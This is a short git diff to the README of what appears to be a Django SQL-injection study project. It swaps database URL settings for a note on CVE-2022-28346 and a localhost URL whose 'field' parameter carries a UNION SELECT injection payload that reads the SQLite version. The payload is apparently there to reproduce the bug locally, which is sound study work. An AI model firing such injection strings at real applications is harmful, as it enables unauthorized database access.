@@ -1,7 +1,7 @@
 # django-rdb-study
 
 ```
-DATABASE_URL=sqlite:///db.sqlite3
-↓
-DATABASE_URL=postgres://postgres:post_db_password@db:5432/post_db
+# cve 2022 28346
+http://localhost:8000
+http://localhost:8000/demo?field=demo.name" FROM "demo_user" union SELECT "1",sqlite_version(),"3" --
 ```
